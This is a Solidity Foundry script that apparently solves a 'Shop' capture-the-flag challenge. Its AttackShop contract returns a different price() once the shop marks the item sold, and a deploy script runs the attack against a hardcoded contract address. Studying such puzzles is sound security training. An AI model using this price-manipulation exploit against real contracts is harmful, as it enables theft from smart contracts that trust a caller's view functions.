// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Shop.sol";
import "forge-std/Script.sol";

contract AttackShop is IBuyer {
    Shop public victim;

    constructor(address _victimAddress) {
        victim = Shop(_victimAddress);
    }

    function price() external view returns (uint256) {
        if(victim.isSold()) {
            return 0;
        } else {
            return 100;
        }
    }

    function attack() public {
        victim.buy();
    }
}

contract ShopSolution is Script {
    Shop victimInstance = Shop(payable(0x7B2c50103c53f7Ca6AB05a41De716d3A2A5f5C91));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        AttackShop attacker = new AttackShop(address(victimInstance));
        attacker.attack();
        vm.stopBroadcast();
    }
}